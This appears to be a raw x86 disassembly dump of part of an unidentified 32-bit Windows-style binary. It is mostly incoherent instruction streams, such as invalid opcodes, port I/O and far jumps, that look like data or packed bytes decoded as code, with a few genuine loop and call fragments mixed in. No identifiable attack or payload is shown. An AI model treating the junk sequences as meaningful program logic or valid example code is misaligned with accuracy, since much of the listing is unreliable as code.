  411234:	adc    ecx,DWORD PTR [esi+0x1b]
  411237:	fiadd  WORD PTR [ebp-0xb907f3c]
  41123d:	in     eax,dx
  41123e:	in     al,0x41
  411240:	cwde   
  411241:	cmp    BYTE PTR [ebx-0x2b],al
  411244:	add    al,ah
  411246:	iret   
  411247:	fisttp DWORD PTR [edi*4-0x4fcfc049]
  41124e:	ds in  eax,dx
  411250:	fild   QWORD PTR [ecx+0x4b]
  411253:	jmp    0x1df39f62
  411258:	xlat   BYTE PTR ds:[ebx]
  411259:	pop    ecx
  41125a:	push   edx
  41125b:	(bad)  
  41125d:	cmp    ch,BYTE PTR [ebp-0x79]
  411260:	or     eax,0x15e1de3
  411265:	shl    DWORD PTR [ecx+ecx*2-0x5e4688ec],0x64
  41126d:	shl    DWORD PTR [ebx-0x12],0x77
  411271:	jp     0x4111fc
  411273:	cdq    
  411274:	add    DWORD PTR [eax],0xbd0bc062
  41127a:	lahf   
  41127b:	fstp   DWORD PTR [edi+0xb]
  41127e:	jl     0x4112aa
  411280:	sub    BYTE PTR [edi],bl
  411282:	sar    BYTE PTR [edx-0x2fa2abca],0xca
  411289:	rcr    DWORD PTR gs:[ebp+0x37],1
  41128d:	daa    
  41128e:	je     0x41123f
  411290:	int3   
  411291:	stos   DWORD PTR es:[edi],eax
  411292:	shr    BYTE PTR [eax-0x52378859],0x3b
  411299:	fadd   QWORD PTR [edi-0x15839084]
  41129f:	pop    edi
  4112a0:	cmp    DWORD PTR ds:0x35f97b5b,ebp
  4112a6:	and    esi,DWORD PTR gs:[ecx-0x7f]
  4112aa:	push   cs
  4112ab:	sbb    esp,DWORD PTR [edx+edi*4+0x32e57d29]
  4112b2:	iret   
  4112b3:	add    ecx,DWORD PTR [esi+0x2fca035f]
  4112b9:	jge    0x41130f
  4112bb:	retf   0x571a
  4112be:	jo     0x4112dc
  4112c0:	out    dx,al
  4112c1:	rcl    BYTE PTR [edi-0x64891fd],cl
  4112c7:	inc    edi
  4112c8:	push   ss
  4112c9:	es jge 0x41125d
  4112cc:	mov    edx,0x78c0c901
  4112d1:	dec    ecx
  4112d2:	sbb    al,0xc3
  4112d4:	adc    eax,0x8312b019
  4112d9:	mov    cl,0x4e
  4112db:	push   0xe40a75e5
  4112e0:	and    DWORD PTR [edi],esp
  4112e2:	and    cl,bh
  4112e4:	int    0xf3
  4112e6:	cs xchg ebp,eax
  4112e8:	xchg   esi,eax
  4112e9:	dec    esi
  4112ea:	in     eax,dx
  4112eb:	cmp    BYTE PTR [ebx-0x288b2670],al
  4112f1:	sbb    DWORD PTR [ecx+0x7e56303],0x1a
  4112f8:	je     0x411373
  4112fa:	loopne 0x41133f
  4112fc:	sbb    edi,ecx
  4112fe:	daa    
  4112ff:	dec    ebp
  411300:	imul   BYTE PTR [edi]
  411302:	aam    0x2d
  411304:	jno    0x411332
  411306:	repz cmp BYTE PTR [edi-0x6406cf33],bh
  41130d:	popa   
  41130e:	mov    ebx,0x3e23ebeb
  411313:	mov    DWORD PTR [ecx+ebx*4-0x4c],0x3a5d0b2b
  41131b:	in     al,dx
  41131c:	cmp    al,0xd7
  41131e:	adc    ebx,DWORD PTR [edx-0x5d0b9c4]
  411324:	lahf   
  411325:	mov    ch,0xf3
  411327:	ja     0x4112cf
  411329:	mov    cl,BYTE PTR cs:[edi+0x53]
  41132d:	mov    ch,0x9d
  41132f:	jb     0x4112e3
  411331:	push   ds
  411332:	pop    ebp
  411333:	dec    eax
  411334:	pop    ecx
  411335:	out    dx,eax
  411336:	pop    DWORD PTR [ebp-0x79]
  411339:	mov    ah,0x18
  41133b:	sbb    cl,BYTE PTR gs:[eax-0x32f55285]
  411342:	adc    DWORD PTR ds:0x175cba6f,ebx
  411348:	pop    eax
  411349:	xor    BYTE PTR [eax+ebp*2-0x1f65f837],bh
  411350:	adc    al,BYTE PTR [ebx+esi*2]
  411353:	les    edx,FWORD PTR [edi-0x1d]
  411356:	mov    esi,esi
  411358:	dec    ebx
  411359:	cdq    
  41135a:	shl    BYTE PTR [edx+0x10],0x97
  41135e:	dec    eax
  41135f:	mov    ch,0x97
  411361:	daa    
  411362:	push   0xdafcf3bd
  411367:	sub    eax,DWORD PTR [edi-0x4fd038ec]
  41136d:	clc    
  41136e:	je     0x4113c1
  411370:	rcr    DWORD PTR ds:0x49233a84,cl
  411376:	scas   al,BYTE PTR es:[edi]
  411377:	fadd   st,st(6)
  411379:	cmp    eax,0x5448a6e
  41137e:	test   al,0x8b
  411380:	push   ebp
  411381:	or     al,0x3a
  411383:	add    cl,BYTE PTR [edi]
  411385:	test   DWORD PTR [ecx-0x74fffffd],ecx
  41138b:	inc    ebp
  41138c:	clc    
  41138d:	mov    edx,DWORD PTR [ebp+0xc]
  411390:	movsx  edx,BYTE PTR [edx]
  411393:	xor    eax,ecx
  411395:	add    eax,esi
  411397:	cmp    edx,eax
  411399:	je     0x41156b
  41139f:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  4113a6:	lea    eax,[ebp-0x18]
  4113a9:	mov    DWORD PTR [ebp-0x14],eax
  4113ac:	mov    eax,DWORD PTR [ebp-0x14]
  4113af:	add    DWORD PTR [eax],0x705fa8f
  4113b5:	mov    eax,DWORD PTR [ebp-0x10]
  4113b8:	mov    edx,DWORD PTR [ebp+0x8]
  4113bb:	xor    eax,ecx
  4113bd:	lea    eax,[eax+edx*1+0x32729b]
  4113c4:	mov    DWORD PTR [ebp+0x8],eax
  4113c7:	jmp    0x411563
  4113cc:	sub    DWORD PTR [esi-0x26],ebx
  4113cf:	sub    al,0x69
  4113d1:	test   al,0xe9
  4113d3:	pop    ebx
  4113d4:	cld    
  4113d5:	add    DWORD PTR [edx+0x1f1893a1],ecx
  4113db:	xchg   BYTE PTR [ecx],al
  4113dd:	inc    eax
  4113de:	jle    0x41145e
  4113e0:	icebp  
  4113e1:	jg     0x411461
  4113e3:	jle    0x4113e6
  4113e5:	fild   WORD PTR [ecx+0x28]
  4113e8:	pop    eax
  4113e9:	cmp    al,0xe5
  4113eb:	lods   eax,DWORD PTR ds:[esi]
  4113ec:	cdq    
  4113ed:	xor    eax,esi
  4113ef:	sub    eax,0x61f80e3c
  4113f4:	loopne 0x4113c4
  4113f6:	scas   al,BYTE PTR es:[edi]
  4113f7:	cwde   
  4113f8:	add    ebx,0x8d7945d9
  4113fe:	cdq    
  4113ff:	pop    ebp
  411400:	pop    ss
  411401:	push   0xa313526
  411406:	sbb    BYTE PTR ds:0x813bc8a9,0x4d
  41140d:	sbb    al,0x3f
  41140f:	pop    esp
  411410:	je     0x4113ae
  411412:	jl     0x4113b3
  411414:	and    DWORD PTR [eax+0x7ab71df6],esi
  41141a:	ins    DWORD PTR es:[edi],dx
  41141b:	fisub  WORD PTR [edi+esi*2]
  41141e:	sub    DWORD PTR [ecx+0x6d9968b8],0x60
  411425:	dec    edi
  411426:	aad    0xd7
  411428:	ds movs BYTE PTR es:[edi],BYTE PTR fs:[esi]
  41142b:	mov    ebx,0xa986072e
  411430:	adc    al,0xe6
  411432:	fnstenv [eax-0x5a]
  411435:	mov    WORD PTR [ecx-0x61],ds
  411438:	int    0x7b
  41143a:	adc    bh,BYTE PTR [esi]
  41143c:	les    esp,FWORD PTR [ebx]
  41143e:	neg    BYTE PTR [ebx]
  411440:	sti    
  411441:	and    bl,BYTE PTR [edi]
  411443:	mov    dh,0x65
  411445:	adc    eax,0x394eb77d
  41144a:	xchg   eax,edi
  41144c:	cmp    eax,0x6d7c6d3
  411451:	and    eax,0x3f9d3e38
  411456:	cmp    DWORD PTR [edx],esi
  411458:	mov    ah,0xe6
  41145a:	inc    esi
  41145b:	scas   eax,DWORD PTR es:[edi]
  41145c:	ins    BYTE PTR es:[edi],dx
  41145d:	neg    DWORD PTR [edi+edi*2]
  411460:	push   es
  411461:	xchg   ecx,eax
  411462:	cmp    esp,DWORD PTR ds:0xb8304279
  411468:	stos   DWORD PTR es:[edi],eax
  411469:	jecxz  0x4114d4
  41146b:	sar    ebx,cl
  41146d:	and    DWORD PTR [ebp+0x6f],0x5b854848
  411474:	fldcw  WORD PTR [ecx+0x24]
  411477:	in     al,0x70
  411479:	add    eax,0x650d24fd
  41147e:	mov    cl,0x2e
  411480:	cmp    eax,0x57852441
  411485:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411486:	sbb    eax,0xb922f04
  41148b:	outs   dx,BYTE PTR ds:[esi]
  41148c:	mov    bl,BYTE PTR [ebx+0x2e]
  41148f:	out    0xe0,al
  411491:	xchg   esp,eax
  411492:	adc    ebp,edi
  411494:	jno    0x4114d9
  411496:	aaa    
  411497:	add    BYTE PTR [esi],bl
  411499:	aad    0x8e
  41149b:	xchg   ebp,eax
  41149c:	add    DWORD PTR [esi-0xa41d9e9],edi
  4114a2:	popf   
  4114a3:	and    esi,DWORD PTR [edx+0x22a24abd]
  4114a9:	sub    bl,BYTE PTR ds:0x82d6c92
  4114af:	jnp    0x4114d6
  4114b1:	and    eax,0xd49661c
  4114b6:	retf   
  4114b7:	ds sub eax,0xd4a6d86b
  4114bd:	cwde   
  4114be:	ja     0x411442
  4114c0:	cmc    
  4114c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4114c2:	(bad)  [ecx]
  4114c4:	push   ebp
  4114c5:	push   ebp
  4114c6:	test   al,0x1f
  4114c8:	push   ecx
  4114c9:	mov    bh,0x94
  4114cb:	jne    0x41145c
  4114cd:	mov    dl,0xd8
  4114cf:	sub    eax,0x58aeb7a0
  4114d4:	pop    edx
  4114d5:	jne    0x411543
  4114d7:	lods   eax,DWORD PTR ds:[esi]
  4114d8:	(bad)  
  4114d9:	out    dx,al
  4114da:	inc    ecx
  4114db:	dec    esp
  4114dc:	cmp    al,0xf
  4114de:	test   al,0xc
  4114e0:	pop    edi
  4114e1:	or     dh,BYTE PTR [ecx-0x2cfc5ee8]
  4114e7:	and    al,BYTE PTR [ebp-0x7d]
  4114ea:	xchg   BYTE PTR [esi+esi*1-0x59428b65],al
  4114f1:	(bad)  
  4114f2:	push   edx
  4114f3:	jb     0x4114b0
  4114f5:	dec    edi
  4114f6:	ja     0x411518
  4114f8:	adc    ecx,0x15
  4114fb:	mov    eax,ds:0xe384a3f5
  411500:	push   0x52
  411502:	dec    ebp
  411503:	add    al,0x8
  411505:	sub    BYTE PTR [ebp+0x5f9318f2],al
  41150b:	mov    al,ds:0xc4bdf20f
  411510:	sbb    DWORD PTR [ebp+0x46],edi
  411513:	mov    dh,0xdf
  411515:	xchg   BYTE PTR [ecx-0x2ee8e6c3],bl
  41151b:	lea    esp,[edi]
  41151d:	shl    BYTE PTR [eax],1
  41151f:	out    dx,eax
  411520:	aad    0xde
  411522:	loopne 0x4114b8
  411524:	and    ebx,DWORD PTR [edx+ebx*8]
  411527:	scas   eax,DWORD PTR es:[edi]
  411528:	repnz xchg ecx,eax
  41152a:	sub    eax,0xe5f8b1f
  41152f:	push   esp
  411530:	pop    es
  411531:	cld    
  411532:	push   ss
  411533:	jmp    0xa13c:0x3830a378
  41153a:	dec    edx
  41153b:	xchg   BYTE PTR [ebx-0x208cc01d],ah
  411541:	fs data16 (bad) 
  411544:	jmp    0xfe6:0xb0cb4b18
  41154b:	out    dx,al
  41154c:	xchg   BYTE PTR [esi-0x14bd9a48],dh
  411552:	jae    0x4115c0
  411554:	sub    DWORD PTR [ecx+0x65],esp
  411557:	or     dl,BYTE PTR [edi+0x6dd04350]
  41155d:	pop    edx
  41155e:	mov    ds:0x19edd1ec,eax
  411563:	inc    DWORD PTR [ebp+0xc]
  411566:	jmp    0x4111ca
  41156b:	mov    eax,DWORD PTR [ebp-0x10]
  41156e:	xor    eax,ecx
  411570:	jmp    0x41170c
  411575:	jmp    0xe967:0xb166b574
  41157c:	jo     0x41155e
  41157e:	fidiv  WORD PTR [edx-0x5c]
  411581:	out    dx,al
  411582:	fwait
  411583:	jge    0x4115be
  411585:	add    BYTE PTR [ecx+0x7e],0x7e
  411589:	icebp  
  41158a:	jg     0x41160a
  41158c:	jle    0x4115ae
  41158e:	out    0xa8,eax
  411590:	hlt    
  411591:	test   al,0x51
  411593:	mov    bh,0x78
  411595:	sar    DWORD PTR [edx],0x56
  411598:	sub    al,0xb8
  41159a:	mov    ds:0xfe642564,al
  41159f:	jge    0x411537
  4115a1:	inc    ecx
  4115a2:	ds stos BYTE PTR es:[edi],al
  4115a4:	push   ebp
  4115a5:	pop    edi
  4115a6:	sub    BYTE PTR [esi],ah
  4115a8:	adc    BYTE PTR [edx+edi*1-0xb],cl
  4115ac:	pop    ebx
  4115ad:	mov    ax,0x2d3e
  4115b1:	mov    bl,0x6a
  4115b3:	inc    esi
  4115b4:	inc    esi
  4115b5:	push   eax
  4115b6:	fwait
  4115b7:	push   es
  4115b8:	daa    
  4115b9:	mov    ds:0x8ba10893,al
  4115be:	and    BYTE PTR [edi-0x13],al
  4115c1:	jmp    0x289f:0x23abe83c
  4115c8:	mov    bh,bh
  4115ca:	sub    DWORD PTR [esi-0x39],edx
  4115cd:	jmp    0x2df6b075
  4115d2:	xor    ah,BYTE PTR [esi+edx*8]
  4115d5:	hlt    
  4115d6:	addr16 faddp st(2),st
  4115d9:	es add al,0xd6
  4115dc:	popa   
  4115dd:	dec    ebx
  4115de:	push   ecx
  4115df:	sbb    BYTE PTR [eax-0x57],ch
  4115e2:	les    edi,FWORD PTR [ebx+0x5415795c]
  4115e8:	mov    edi,0x8a0bb463
  4115ed:	rol    BYTE PTR [ebx-0x32d6f655],1
  4115f3:	inc    edx
  4115f4:	addr16 jne 0x4115cf
  4115f7:	push   0xc2f45b8a
  4115fc:	pop    ebx
  4115fd:	dec    esp
  4115fe:	arpl   WORD PTR [ebx+ecx*4+0x175f31f5],si
  411605:	pushf  
  411606:	mov    WORD PTR [edi-0xb],ss
  411609:	ret    
  41160a:	in     eax,0x1e
  41160c:	sahf   
  41160d:	je     0x411676
  41160f:	mov    ch,0x9c
  411611:	jne    0x411617
  411613:	enter  0x26e3,0x57
  411617:	pop    esp
  411618:	xchg   DWORD PTR [ebx],ebp
  41161a:	(bad)
  41161d:	jae    0x41166e
  41161f:	ins    DWORD PTR es:[edi],dx
  411620:	fld    TBYTE PTR [eax+0x55799e14]
  411626:	dec    esi
  411627:	stos   BYTE PTR es:[edi],al
  411628:	push   edx
  411629:	fild   DWORD PTR [ecx+0x65]
  41162c:	popf   
  41162d:	cmp    eax,0xe6e946f0
  411632:	pop    es
  411633:	imul   BYTE PTR [ebx-0x6519e501]
  411639:	(bad)  
  41163a:	mov    dh,0xf8
  41163c:	push   ebp
  41163d:	jge    0x41168c
  41163f:	mov    ch,0x2d
  411641:	fwait
  411642:	xor    edi,0x45
  411645:	retf   
  411646:	stc    
  411647:	push   edi
  411648:	push   ebx
  411649:	xor    ch,bl
  41164b:	xchg   edx,eax
  41164c:	lea    eax,ds:0x2f570230
  411652:	cmp    BYTE PTR [esi],0x3b
  411655:	adc    bh,bl
  411657:	stc    
  411658:	mov    eax,ds:0xcca0fb8f
  41165d:	ficomp WORD PTR ds:0x26969691
  411663:	loope  0x4116e2
  411665:	in     al,0x7b
  411667:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411668:	rcr    dl,cl
  41166a:	loope  0x41161e
  41166c:	mov    al,0x21
  41166e:	dec    ebx
  41166f:	(bad)  
  411671:	mov    ebx,0xb77f979f
  411676:	sti    
  411677:	add    al,0x65
  411679:	inc    ecx
  41167a:	(bad)  
  41167b:	arpl   WORD PTR [edi-0x7c],si
  41167e:	nop
  41167f:	test   eax,0xbef63008
  411684:	and    ecx,DWORD PTR [ebp-0x77]
  411687:	ficom  WORD PTR [ecx+0x4bccff3a]
  41168d:	rcl    BYTE PTR [esi],cl
  41168f:	sub    eax,0x62e36d9b
  411694:	das    
  411695:	cs push eax
  411697:	xor    eax,0x33c4ae67
  41169c:	sub    ebp,DWORD PTR [edi+0x6561497a]
  4116a2:	jne    0x4116c0
  4116a4:	data16 ins BYTE PTR es:[edi],dx
  4116a6:	push   ebx
  4116a7:	shl    BYTE PTR [eax+0x2],1
  4116aa:	pop    esi
  4116ab:	xchg   BYTE PTR [esi+0x14a25e7f],bh
  4116b1:	mov    ah,0xdf
  4116b3:	and    ch,BYTE PTR [edx+eiz*2]
  4116b6:	adc    BYTE PTR [edi-0x3],0xc9
  4116ba:	stos   DWORD PTR es:[edi],eax
  4116bb:	jae    0x4116f8
  4116bd:	fwait
  4116be:	xchg   ebp,eax
  4116bf:	mov    ds:0xd32c286e,al
  4116c4:	jnp    0x4116df
  4116c6:	rcr    DWORD PTR [esi-0x1c],1
  4116c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4116ca:	cs nop
  4116cc:	sti    
  4116cd:	and    DWORD PTR [ebp-0x6b],ecx
  4116d0:	jns    0x4116c0
  4116d2:	addr16 pusha 
  4116d4:	sahf   
  4116d5:	ficomp WORD PTR [ebp-0x7331f063]
  4116db:	dec    ebx
  4116dc:	inc    edx
  4116dd:	add    al,0x42
  4116df:	jmp    0x4116d3
  4116e1:	rol    ch,cl
  4116e3:	jge    0x41172c
  4116e5:	scas   al,BYTE PTR es:[edi]
  4116e6:	and    BYTE PTR [edi+0x214f2a10],ah
  4116ec:	adc    eax,0xfa4f5c1a
  4116f1:	retf   
  4116f2:	shl    ch,cl
  4116f4:	icebp  
  4116f5:	mov    edx,0x57d8eb19
  4116fa:	lock aaa 
  4116fc:	(bad)  
  4116fd:	call   DWORD PTR [ebp+0x36b65b0a]
  411703:	mov    al,0xbe
  411705:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411706:	sub    BYTE PTR [ecx-0x7],bl
  411709:	cmp    eax,edx
  41170b:	sub    eax,0x3104d8b
  411710:	(bad)  
  411711:	mov    DWORD PTR [ecx],eax
  411713:	pop    esi
  411714:	leave  
  411715:	ret    0xc
  411718:	push   ebp
  411719:	mov    ebp,esp
  41171b:	push   ecx
  41171c:	neg    eax
  41171e:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  411725:	mov    eax,DWORD PTR [ebp+0x8]
  411728:	adc    DWORD PTR ds:0x4337ab,0x2178
  411732:	mov    al,BYTE PTR [eax]
  411734:	sbb    DWORD PTR ds:0x4337fb,0x4337c3
  41173e:	add    al,0x38
  411740:	xor    al,0x46
  411742:	cmp    al,0xc3
  411744:	mov    DWORD PTR ds:0x433803,0x7813
  41174e:	jne    0x411ea2
  411754:	and    edx,DWORD PTR ds:0x43382b
  41175a:	mov    eax,DWORD PTR [ebp+0x8]
  41175d:	xor    DWORD PTR ds:0x4337bb,0x67d7
  411767:	mov    ecx,DWORD PTR [ebp+0x8]
  41176a:	add    edx,0xbb1
  411770:	jmp    0x4119ab
  411775:	jo     0x4117d4
  411777:	sbb    DWORD PTR [esi],0x7171e291
  41177d:	rol    DWORD PTR [edi],1
  41177f:	push   ebx
  411780:	sbb    eax,0x6abaf94a
  411785:	add    ecx,DWORD PTR [edi+0x7e]
  411788:	jle    0x41179a
  41178a:	jl     0x41180a
  41178c:	jle    0x41174d
  41178e:	jno    0x41175c
  411790:	and    DWORD PTR [esi+eiz*2],esp
  411793:	jnp    0x41178e
  411795:	popf   
  411796:	jae    0x41174a
  411798:	icebp  
  411799:	cdq    
  41179a:	scas   al,BYTE PTR es:[edi]
  41179b:	adc    edi,eax
  41179d:	push   ebp
  41179e:	xor    eax,0x852319fb
  4117a3:	lods   al,BYTE PTR ds:[esi]
  4117a4:	adc    al,BYTE PTR [esi+0x121075e0]
  4117aa:	push   edi
  4117ab:	mov    edx,edx
  4117ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4117ae:	mov    esp,0xcd1c08c1
  4117b3:	ins    DWORD PTR es:[edi],dx
  4117b4:	mov    ch,0xfd
  4117b6:	mov    dl,0x6e
  4117b8:	push   ebx
  4117b9:	add    ebp,DWORD PTR [edi-0xc1fe750]
  4117bf:	push   ebp
  4117c0:	add    eax,0xe4d6219b
  4117c5:	push   ebx
  4117c6:	jnp    0x41181f
  4117c8:	(bad)  
  4117c9:	or     eax,0x5f8ddd0e
  4117ce:	push   ds
  4117cf:	scas   al,BYTE PTR es:[edi]
  4117d0:	sbb    eax,0x57efb6e9
  4117d5:	das    
  4117d6:	test   eax,0xf3852778
  4117db:	aam    0x89
  4117dd:	dec    esp
  4117de:	cmp    eax,0x5bb7d9d2
  4117e3:	xor    esi,edi
  4117e5:	int    0x8e
  4117e7:	aad    0x61
  4117e9:	addr16 pop esp
  4117eb:	xchg   bl,bh
  4117ed:	mov    esi,0x35c2541
  4117f2:	lahf   
  4117f3:	adc    DWORD PTR [ecx],eax
  4117f5:	fcomi  st,st(6)
  4117f7:	sbb    al,0xb0
  4117f9:	out    dx,al
  4117fa:	add    al,0xcd
  4117fc:	and    DWORD PTR [eax+eax*2-0x5e],ebx
  411800:	cs push edi
  411802:	mov    ds:0x25d94157,eax
  411807:	je     0x4117e8
  411809:	and    al,0x63
  41180b:	jmp    0x41187f
  41180d:	(bad)  
  41180e:	mov    edx,DWORD PTR [ecx+0x51]
  411811:	jge    0x411868
  411813:	jbe    0x4117d3
  411815:	inc    eax
  411816:	ins    DWORD PTR es:[edi],dx
  411817:	xchg   ecx,eax
  411818:	stc    
  411819:	daa    
  41181a:	aam    0x9c
  41181c:	imul   ebx,DWORD PTR [edi-0x6e],0x75
  411820:	sbb    dl,BYTE PTR [ebp-0x7ffa4437]
  411826:	sti    
  411827:	mov    ebx,0x3a994ffd
  41182c:	pushf  
  41182d:	mov    cl,0x5d
  41182f:	pop    esp
  411830:	das    
  411831:	add    eax,0x773da34a
  411836:	pop    ds
  411837:	in     eax,dx
  411838:	popa   
  411839:	cmp    edi,DWORD PTR [eax+0x19c066d5]
  41183f:	shr    ebx,cl
  411841:	dec    eax
  411842:	outs   dx,BYTE PTR ds:[esi]
  411843:	mov    ch,0xd7
  411845:	push   ebp
  411846:	aas    
  411847:	jg     0x41182d
  411849:	nop
  41184a:	jmp    0xda69:0x62d0fc65
  411851:	fidiv  DWORD PTR [ecx-0x62668ab3]
  411857:	lods   eax,DWORD PTR ds:[esi]
  411858:	daa    
  411859:	adc    edx,DWORD PTR [ecx]
  41185b:	push   ecx
  41185c:	dec    esi
  41185d:	adc    al,0xac
  41185f:	jp     0x411896
  411861:	sti    
  411862:	jae    0x411894
  411864:	push   DWORD PTR [ebp-0x7a]
  411867:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411868:	jne    0x4117f2
  41186a:	cdq    
  41186b:	xchg   ecx,eax
  41186c:	call   0x427ea788
  411871:	(bad)  
  411872:	mov    dh,0x29
  411874:	outs   dx,BYTE PTR ds:[esi]
  411875:	inc    edi
  411876:	ja     0x41183e
  411878:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411879:	in     eax,0xf6
  41187b:	mov    cl,0xec
  41187d:	fist   DWORD PTR [esi]
  41187f:	fisubr DWORD PTR [ebp-0x6]
  411882:	dec    edi
  411883:	mov    ?,WORD PTR [ebx+edi*8]
  411886:	add    DWORD PTR [ebp+0x6f],edi
  411889:	in     eax,dx
  41188a:	and    al,0xed
  41188c:	in     eax,0x3a
  41188e:	or     DWORD PTR [edx+0x42],esp
  411891:	int3   
  411892:	inc    ebp
  411893:	adc    al,0x8b
  411895:	jecxz  0x4118c3
  411897:	imul   ebp,ecx,0x51625375
  41189d:	ins    BYTE PTR es:[edi],dx
  41189e:	xchg   BYTE PTR [ebp+0x7d151831],cl
  4118a4:	sahf   
  4118a5:	jmp    0x40f87b18
  4118aa:	cli    
  4118ab:	imul   edi,DWORD PTR [ecx],0xb3a377b3
  4118b1:	ins    DWORD PTR es:[edi],dx
  4118b2:	scas   eax,DWORD PTR es:[edi]
  4118b3:	out    0x3,eax
  4118b5:	nop
  4118b6:	xlat   BYTE PTR ds:[ebx]
  4118b7:	getsec 
  4118b9:	arpl   WORD PTR [ebx+0x79],cx
  4118bc:	sbb    edx,ebp
  4118be:	icebp  
  4118bf:	or     DWORD PTR [edx],ecx
  4118c1:	mov    ecx,0xd920eee1
  4118c6:	jmp    0x7a83:0xc5b1c794
  4118cd:	aaa    
  4118ce:	jo     0x411907
  4118d0:	dec    esi
  4118d1:	mov    ch,0x49
  4118d3:	loop   0x411898
  4118d5:	or     al,0xce
  4118d7:	dec    edx
  4118d8:	adc    eax,0xf4f819eb
  4118dd:	sbb    DWORD PTR [edx-0x54],ecx
  4118e0:	sub    ebx,ecx
  4118e2:	sub    ebp,DWORD PTR [edi]
  4118e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4118e5:	xchg   edi,eax
  4118e6:	mov    esp,0xae048722
  4118eb:	jb     0x41196b
  4118ed:	sbb    ah,dl
  4118ef:	push   DWORD PTR [ebx-0x4d]
  4118f2:	xor    eax,0x59f76939
  4118f7:	jbe    0x411903
  4118f9:	lds    edi,FWORD PTR [esi-0x30dcb3b3]
  4118ff:	xor    al,0x9a
  411901:	mov    ebp,0xd3effd68
  411906:	lods   al,BYTE PTR ds:[esi]
  411907:	jle    0x41190b
  411909:	jmp    0x4f86:0xd2be8072
  411910:	cld    
  411911:	jmp    0xb60f7b87
  411916:	cdq    
  411917:	int    0xb6
  411919:	jbe    0x4118b4
  41191b:	xchg   esi,eax
  41191c:	dec    ecx
  41191d:	mov    esi,0x2e1da144
  411922:	aad    0x9b
  411924:	xor    esp,DWORD PTR [ecx+eiz*4+0x7db5a8a1]
  41192b:	mov    edx,0x479ce174
  411930:	adc    eax,0xe581e2bb
  411935:	jmp    0x411940
  411937:	jns    0x4119b1
  411939:	jo     0x41194e
  41193b:	into   
  41193c:	test   al,0x64
  41193e:	cmp    al,BYTE PTR [edx]
  411940:	test   al,0xb5
  411942:	in     eax,dx
  411943:	data16 or al,0x5b
  411946:	(bad)  
  411947:	(bad)  
  411948:	adc    DWORD PTR [esp+eiz*4+0x15],ebx
  41194c:	imul   ebp,eax,0xcdc1a77c
  411952:	jno    0x4118eb
  411954:	shl    BYTE PTR [esi+0x7c870836],cl
  41195a:	inc    ecx
  41195b:	test   bl,0x7a
  41195e:	jmp    0x32f7:0x859a9ee4
  411965:	or     bh,ch
  411967:	es and eax,0xcb26c18b
  41196d:	ins    DWORD PTR es:[edi],dx
  41196e:	and    DWORD PTR [eax-0x7ebcbde5],esi
  411974:	scas   eax,DWORD PTR es:[edi]
  411975:	gs (bad) 
  411977:	sub    DWORD PTR [esi],ebx
  411979:	cmp    ebx,DWORD PTR [ecx]
  41197b:	mov    ebx,0x4298c09d
  411980:	mov    ds:0x2be3ec52,eax
  411985:	sbb    al,0xe5
  411987:	enter  0x9cdb,0xf
  41198b:	dec    eax
  41198c:	jbe    0x41194f
  41198e:	out    0xea,eax
  411990:	xor    BYTE PTR [ebx+eax*1+0x758d1906],bh
  411997:	xchg   ebp,eax
  411998:	test   eax,0x26dfbcee
  41199d:	(bad)  
  41199e:	scas   al,BYTE PTR es:[edi]
  41199f:	add    ebx,eax
  4119a1:	loop   0x411928
  4119a3:	mov    ecx,0xb52c4a25
  4119a8:	adc    DWORD PTR [edx+0x3c480373],ecx
  4119ae:	or     DWORD PTR ds:0x433723,ebx
  4119b4:	mov    edx,0x7510854
  4119b9:	mov    DWORD PTR [ebp+0x8],ecx
  4119bc:	and    DWORD PTR ds:0x433827,0x0
  4119c6:	jmp    0x4119d6
  4119cb:	mov    eax,ds:0x433827
  4119d0:	inc    eax
  4119d1:	mov    ds:0x433827,eax
  4119d6:	cmp    DWORD PTR ds:0x433827,0x17
  4119dd:	jae    0x4119fe
  4119e3:	cmp    DWORD PTR ds:0x433827,0x27
  4119ea:	jne    0x4119f9
  4119f0:	push   DWORD PTR [ebp-0x10]
  4119f3:	call   DWORD PTR ds:0x4123b8
  4119f9:	jmp    0x4119cb
  4119fe:	mov    eax,DWORD PTR [ebp-0x4]
  411a01:	jmp    0x411c3c
  411a06:	pop    edi
  411a07:	pop    edx
  411a08:	dec    eax
  411a09:	pop    es
  411a0a:	dec    ecx
  411a0b:	xor    eax,0xcba06271
  411a10:	outs   dx,DWORD PTR ds:[esi]
  411a11:	aam    0x31
  411a13:	xchg   ebx,eax
  411a14:	mov    bl,0x79
  411a16:	and    eax,0x107e7e4d
  411a1b:	jl     0x411a9b
  411a1d:	jle    0x4119b0
  411a1f:	sub    eax,0xc9b8af21
  411a24:	pop    eax
  411a25:	or     eax,0x3f5661ca
  411a2a:	ret    
  411a2b:	dec    ebp
  411a2c:	dec    esi
  411a2d:	xchg   esp,eax
  411a2e:	or     DWORD PTR [eax],esp
  411a30:	(bad)  
  411a31:	and    cl,BYTE PTR [ebp-0x67]
  411a34:	add    al,0xff
  411a36:	ja     0x4119d5
  411a38:	fsubr  QWORD PTR [edi]
  411a3a:	push   ecx
  411a3b:	push   edi
  411a3c:	mov    eax,ds:0x94c5b58b
  411a41:	push   es
  411a42:	mov    al,0xc5
  411a44:	stos   BYTE PTR es:[edi],al
  411a45:	les    edx,FWORD PTR [edi+0x1]
  411a48:	je     0x411a87
  411a4a:	and    al,0x59
  411a4c:	xchg   esp,ebx
  411a4e:	mov    esi,0x5301d5c9
  411a53:	not    BYTE PTR [edx+0x5d]
  411a56:	(bad)  
  411a57:	lods   al,BYTE PTR ds:[esi]
  411a58:	mov    al,ds:0xfe2088c6
  411a5d:	ins    BYTE PTR es:[edi],dx
  411a5e:	cli    
  411a5f:	or     esp,esp
  411a61:	out    0x47,al
  411a63:	je     0x411a17
  411a65:	call   0x3776:0x6a9282a8
  411a6c:	in     eax,dx
  411a6d:	mov    ds:0x107e61bc,al
  411a72:	outs   dx,BYTE PTR ds:[esi]
  411a73:	fsubr  QWORD PTR [edx-0x3824eba3]
